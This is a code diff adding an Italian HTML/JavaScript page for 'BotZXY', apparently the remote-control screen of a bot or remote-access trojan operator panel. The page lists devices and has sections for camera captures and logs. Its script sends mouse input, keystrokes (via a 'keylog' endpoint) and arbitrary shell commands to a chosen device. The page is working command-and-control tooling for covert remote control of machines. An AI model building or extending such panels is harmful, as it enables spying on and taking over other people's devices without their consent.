@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BotZXY · Controllo Remoto</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family:'Inter',sans-serif;
+            background:var(--bg-primary,#0b0b1a);
+            color:var(--text-primary,#e2e8f0);
+            min-height:100vh;
+            display:flex;
+        }
+        .sidebar {
+            width:220px;
+            background:rgba(12,12,35,0.92);
+            backdrop-filter:blur(24px);
+            border-right:1px solid rgba(255,255,255,0.04);
+            padding:1.8rem 1.2rem;
+            display:flex;
+            flex-direction:column;
+            min-height:100vh;
+            position:fixed;
+            top:0; left:0;
+            height:100vh;
+            z-index:100;
+        }
+        .sidebar .logo { font-size:1.6rem; font-weight:800; background:linear-gradient(135deg,#8b5cf6,#22d3ee); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; padding-bottom:1.5rem; border-bottom:1px solid rgba(255,255,255,0.04); }
+        .sidebar .logo i { -webkit-text-fill-color:initial; color:#8b5cf6; }
+        .sidebar .logo span { -webkit-text-fill-color:rgba(255,255,255,0.1); }
+        .sidebar .nav { display:flex; flex-direction:column; gap:0.2rem; flex:1; padding-top:1.2rem; }
+        .sidebar .nav a { display:flex; align-items:center; gap:0.8rem; padding:0.7rem 1rem; border-radius:12px; color:rgba(255,255,255,0.3); text-decoration:none; font-size:0.85rem; font-weight:500; transition:all 0.3s; }
+        .sidebar .nav a i { font-size:1.1rem; min-width:24px; }
+        .sidebar .nav a:hover { color:#fff; background:rgba(139,92,246,0.08); }
+        .sidebar .nav a.active { color:#8b5cf6; background:rgba(139,92,246,0.1); }
+        .sidebar .footer-sidebar { font-size:0.6rem; color:rgba(255,255,255,0.06); text-align:center; padding-top:1rem; border-top:1px solid rgba(255,255,255,0.04); letter-spacing:0.05em; }
+        .sidebar .footer-sidebar .status-dot { display:inline-block; width:6px; height:6px; border-radius:50%; background:#34d399; box-shadow:0 0 12px rgba(52,211,153,0.4); animation:pulse 2s ease-in-out infinite; margin-right:6px; }
+        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+        .main { margin-left:220px; padding:1.8rem 2.2rem; width:100%; }
+        .topbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:2rem; flex-wrap:wrap; gap:0.8rem; }
+        .topbar h1 { font-size:1.4rem; font-weight:600; }
+        .topbar h1 span { color:rgba(255,255,255,0.2); font-weight:400; }
+        .remote-container {
+            display:grid;
+            grid-template-columns:1fr 300px;
+            gap:1.5rem;
+        }
+        .remote-screen {
+            background:rgba(18,18,40,0.45);
+            border-radius:24px;
+            border:1px solid rgba(255,255,255,0.04);
+            padding:1.5rem;
+            position:relative;
+            min-height:500px;
+        }
+        .remote-screen .screen-placeholder {
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            justify-content:center;
+            height:400px;
+            color:rgba(255,255,255,0.1);
+        }
+        .remote-screen .screen-placeholder i { font-size:4rem; margin-bottom:1rem; }
+        .remote-controls {
+            background:rgba(18,18,40,0.45);
+            border-radius:24px;
+            border:1px solid rgba(255,255,255,0.04);
+            padding:1.5rem;
+        }
+        .remote-controls .control-group { margin-bottom:1.5rem; }
+        .remote-controls .control-group label { display:block; font-size:0.7rem; color:rgba(255,255,255,0.3); text-transform:uppercase; margin-bottom:0.3rem; }
+        .remote-controls .control-group select, .remote-controls .control-group input {
+            width:100%; padding:0.5rem; border-radius:8px;
+            background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06);
+            color:#fff; font-size:0.85rem;
+        }
+        .remote-controls .control-group select:focus, .remote-controls .control-group input:focus {
+            outline:none; border-color:#8b5cf6;
+        }
+        .keyboard-grid {
+            display:grid;
+            grid-template-columns:repeat(7,1fr);
+            gap:0.3rem;
+            margin-top:0.5rem;
+        }
+        .keyboard-grid button {
+            padding:0.5rem;
+            background:rgba(255,255,255,0.04);
+            border:1px solid rgba(255,255,255,0.06);
+            border-radius:6px;
+            color:#fff;
+            cursor:pointer;
+            font-size:0.7rem;
+            transition:all 0.3s;
+        }
+        .keyboard-grid button:hover { background:rgba(139,92,246,0.15); border-color:#8b5cf6; }
+        .keyboard-grid button.space { grid-column:span 2; }
+        .btn-ghost { background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.06); color:rgba(255,255,255,0.4); padding:0.4rem 1rem; border-radius:40px; cursor:pointer; font-size:0.75rem; transition:all 0.3s; display:inline-flex; align-items:center; gap:0.4rem; }
+        .btn-ghost:hover { background:rgba(139,92,246,0.08); color:#fff; border-color:rgba(139,92,246,0.2); }
+        .btn-primary { background:linear-gradient(135deg,#7c3aed,#3b82f6); border:none; color:#fff; padding:0.4rem 1.2rem; border-radius:8px; cursor:pointer; font-weight:600; font-family:'Inter',sans-serif; transition:all 0.3s; }
+        .btn-primary:hover { transform:translateY(-2px); box-shadow:0 0 30px rgba(120,80,255,0.2); }
+        .mouse-area {
+            width:100%;
+            height:300px;
+            background:rgba(0,0,0,0.3);
+            border-radius:12px;
+            border:2px dashed rgba(255,255,255,0.1);
+            cursor:crosshair;
+            position:relative;
+            margin-top:0.5rem;
+        }
+        .mouse-area .cursor-dot {
+            width:12px;
+            height:12px;
+            background:#8b5cf6;
+            border-radius:50%;
+            position:absolute;
+            transform:translate(-50%,-50%);
+            pointer-events:none;
+            box-shadow:0 0 20px rgba(139,92,246,0.4);
+        }
+        .sidebar-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:90; }
+        .sidebar-overlay.active { display:block; }
+        .hamburger { display:none; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06); color:#fff; padding:0.4rem 0.8rem; border-radius:10px; cursor:pointer; }
+        @media (max-width:992px) { .remote-container { grid-template-columns:1fr; } }
+        @media (max-width:768px) {
+            .sidebar { transform:translateX(-100%); width:240px; }
+            .sidebar.open { transform:translateX(0); }
+            .main { margin-left:0; padding:1rem; }
+            .hamburger { display:block; }
+            .keyboard-grid { grid-template-columns:repeat(4,1fr); }
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+    <aside class="sidebar" id="sidebar">
+        <div class="logo"><i class="fas fa-robot"></i> Bot<span>ZXY</span></div>
+        <nav class="nav">
+            <a href="/dashboard" data-i18n="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
+            <a href="/devices" data-i18n="devices"><i class="fas fa-mobile-alt"></i> Devices</a>
+            <a href="/captures" data-i18n="captures"><i class="fas fa-camera"></i> Captures</a>
+            <a href="/analytics" data-i18n="analytics"><i class="fas fa-chart-pie"></i> Analytics</a>
+            <a href="/logs" data-i18n="logs"><i class="fas fa-history"></i> Logs</a>
+            <a href="#" class="active" data-i18n="remote"><i class="fas fa-desktop"></i> Remote</a>
+            <a href="/settings" data-i18n="settings"><i class="fas fa-cog"></i> Settings</a>
+            <a href="/logout" data-i18n="logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
+        </nav>
+        <div class="footer-sidebar"><span class="status-dot"></span> <span data-i18n="system_active">Sistema attivo</span> · <span id="footerTime"></span></div>
+    </aside>
+
+    <main class="main">
+        <div class="topbar">
+            <div style="display:flex;align-items:center;gap:0.8rem;">
+                <button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
+                <h1>Controllo Remoto <span>| Mouse e Tastiera</span></h1>
+            </div>
+            <div>
+                <button class="btn-ghost" onclick="refreshDevices()"><i class="fas fa-sync"></i> Aggiorna</button>
+            </div>
+        </div>
+
+        <div class="remote-container">
+            <div class="remote-screen">
+                <h3 style="margin-bottom:0.5rem;"><i class="fas fa-desktop"></i> Schermo dispositivo</h3>
+                <div class="mouse-area" id="mouseArea">
+                    <div class="cursor-dot" id="cursorDot"></div>
+                </div>
+                <div style="margin-top:0.8rem;display:flex;gap:0.5rem;flex-wrap:wrap;">
+                    <button class="btn-primary" onclick="sendMouseClick('left')"><i class="fas fa-mouse-pointer"></i> Click Sinistro</button>
+                    <button class="btn-primary" onclick="sendMouseClick('right')"><i class="fas fa-mouse-pointer"></i> Click Destro</button>
+                    <button class="btn-ghost" onclick="sendMouseScroll('up')"><i class="fas fa-arrow-up"></i> Scroll Su</button>
+                    <button class="btn-ghost" onclick="sendMouseScroll('down')"><i class="fas fa-arrow-down"></i> Scroll Giù</button>
+                </div>
+                <div style="margin-top:0.5rem;font-size:0.7rem;color:rgba(255,255,255,0.2);">
+                    Posizione: <span id="mousePos">X: 0, Y: 0</span>
+                </div>
+            </div>
+
+            <div class="remote-controls">
+                <div class="control-group">
+                    <label><i class="fas fa-mobile-alt"></i> Dispositivo</label>
+                    <select id="deviceSelect">
+                        <option value="">Seleziona dispositivo...</option>
+                    </select>
+                </div>
+
+                <div class="control-group">
+                    <label><i class="fas fa-keyboard"></i> Tastiera</label>
+                    <div class="keyboard-grid">
+                        <button onclick="sendKey('a')">A</button>
+                        <button onclick="sendKey('b')">B</button>
+                        <button onclick="sendKey('c')">C</button>
+                        <button onclick="sendKey('d')">D</button>
+                        <button onclick="sendKey('e')">E</button>
+                        <button onclick="sendKey('f')">F</button>
+                        <button onclick="sendKey('g')">G</button>
+                        <button onclick="sendKey('h')">H</button>
+                        <button onclick="sendKey('i')">I</button>
+                        <button onclick="sendKey('j')">J</button>
+                        <button onclick="sendKey('k')">K</button>
+                        <button onclick="sendKey('l')">L</button>
+                        <button onclick="sendKey('m')">M</button>
+                        <button onclick="sendKey('n')">N</button>
+                        <button onclick="sendKey('o')">O</button>
+                        <button onclick="sendKey('p')">P</button>
+                        <button onclick="sendKey('q')">Q</button>
+                        <button onclick="sendKey('r')">R</button>
+                        <button onclick="sendKey('s')">S</button>
+                        <button onclick="sendKey('t')">T</button>
+                        <button onclick="sendKey('u')">U</button>
+                        <button onclick="sendKey('v')">V</button>
+                        <button onclick="sendKey('w')">W</button>
+                        <button onclick="sendKey('x')">X</button>
+                        <button onclick="sendKey('y')">Y</button>
+                        <button onclick="sendKey('z')">Z</button>
+                        <button onclick="sendKey(' ')">␣</button>
+                        <button onclick="sendKey('enter')">↵</button>
+                        <button onclick="sendKey('backspace')">⌫</button>
+                        <button onclick="sendKey('tab')">⇥</button>
+                        <button onclick="sendKey('escape')">Esc</button>
+                        <button onclick="sendKey('delete')">Del</button>
+                    </div>
+                </div>
+
+                <div class="control-group">
+                    <label><i class="fas fa-terminal"></i> Comando</label>
+                    <div style="display:flex;gap:0.3rem;">
+                        <input type="text" id="cmdInput" placeholder="Esegui comando..." style="flex:1;padding:0.4rem;border-radius:8px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);color:#fff;" />
+                        <button class="btn-primary" onclick="sendCommand()"><i class="fas fa-play"></i></button>
+                    </div>
+                </div>
+
+                <div class="control-group">
+                    <label><i class="fas fa-undo"></i> Azioni rapide</label>
+                    <div style="display:flex;flex-wrap:wrap;gap:0.3rem;">
+                        <button class="btn-ghost" onclick="sendKey('ctrl+c')">Ctrl+C</button>
+                        <button class="btn-ghost" onclick="sendKey('ctrl+v')">Ctrl+V</button>
+                        <button class="btn-ghost" onclick="sendKey('ctrl+x')">Ctrl+X</button>
+                        <button class="btn-ghost" onclick="sendKey('ctrl+a')">Ctrl+A</button>
+                        <button class="btn-ghost" onclick="sendKey('alt+tab')">Alt+Tab</button>
+                        <button class="btn-ghost" onclick="sendKey('win')">Win</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        let selectedDevice = null;
+        let mouseX = 0, mouseY = 0;
+
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('sidebarOverlay').classList.toggle('active');
+        }
+
+        function refreshDevices() {
+            fetch('/api/devices')
+                .then(res => res.json())
+                .then(data => {
+                    const select = document.getElementById('deviceSelect');
+                    select.innerHTML = '<option value="">Seleziona dispositivo...</option>';
+                    data.forEach(d => {
+                        const opt = document.createElement('option');
+                        opt.value = d.device_id;
+                        opt.textContent = d.hostname + ' (' + d.platform + ')';
+                        select.appendChild(opt);
+                    });
+                });
+        }
+
+        document.getElementById('deviceSelect').addEventListener('change', function() {
+            selectedDevice = this.value;
+            if (selectedDevice) {
+                document.querySelector('.mouse-area').style.borderColor = '#8b5cf6';
+            }
+        });
+
+        // Mouse tracking
+        const mouseArea = document.getElementById('mouseArea');
+        const cursorDot = document.getElementById('cursorDot');
+
+        mouseArea.addEventListener('mousemove', function(e) {
+            const rect = this.getBoundingClientRect();
+            mouseX = Math.round((e.clientX - rect.left) / rect.width * 100);
+            mouseY = Math.round((e.clientY - rect.top) / rect.height * 100);
+            cursorDot.style.left = mouseX + '%';
+            cursorDot.style.top = mouseY + '%';
+            document.getElementById('mousePos').textContent = 'X: ' + mouseX + '%, Y: ' + mouseY + '%';
+
+            if (selectedDevice) {
+                sendMouseMove(mouseX, mouseY);
+            }
+        });
+
+        mouseArea.addEventListener('click', function(e) {
+            if (selectedDevice) {
+                sendMouseClick('left');
+            }
+        });
+
+        mouseArea.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            if (selectedDevice) {
+                sendMouseClick('right');
+            }
+        });
+
+        function sendMouseMove(x, y) {
+            if (!selectedDevice) return;
+            fetch('/api/mouse/' + selectedDevice, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'move', x: x, y: y, timestamp: new Date().toISOString() })
+            }).catch(() => {});
+        }
+
+        function sendMouseClick(button) {
+            if (!selectedDevice) { alert('Seleziona un dispositivo prima!'); return; }
+            fetch('/api/mouse/' + selectedDevice, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'click', x: mouseX, y: mouseY, button: button, timestamp: new Date().toISOString() })
+            }).then(() => { alert('✅ Click ' + button + ' inviato a ' + selectedDevice.substring(0,8) + '...'); })
+              .catch(() => { alert('❌ Errore'); });
+        }
+
+        function sendMouseScroll(direction) {
+            if (!selectedDevice) { alert('Seleziona un dispositivo prima!'); return; }
+            fetch('/api/mouse/' + selectedDevice, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'scroll', direction: direction, timestamp: new Date().toISOString() })
+            }).then(() => { alert('✅ Scroll ' + direction + ' inviato'); })
+              .catch(() => { alert('❌ Errore'); });
+        }
+
+        function sendKey(key) {
+            if (!selectedDevice) { alert('Seleziona un dispositivo prima!'); return; }
+            fetch('/api/keylog/' + selectedDevice, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ keys: key, timestamp: new Date().toISOString() })
+            }).then(() => { console.log('✅ Tasto inviato:', key); })
+              .catch(() => {});
+        }
+
+        function sendCommand() {
+            const cmd = document.getElementById('cmdInput').value;
+            if (!cmd || !selectedDevice) { alert('Seleziona un dispositivo e inserisci un comando!'); return; }
+            fetch('/api/command/' + selectedDevice, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'execute', params: cmd })
+            }).then(() => { alert('✅ Comando inviato: ' + cmd); document.getElementById('cmdInput').value = ''; })
+              .catch(() => { alert('❌ Errore'); });
+        }
+
+        function updateTime() {
+            document.getElementById('footerTime').textContent = new Date().toLocaleTimeString('it-IT');
+        }
+
+        refreshDevices();
+        setInterval(refreshDevices, 30000);
+        setInterval(updateTime, 1000);
+        updateTime();
+    </script>
+</body>
+</html>
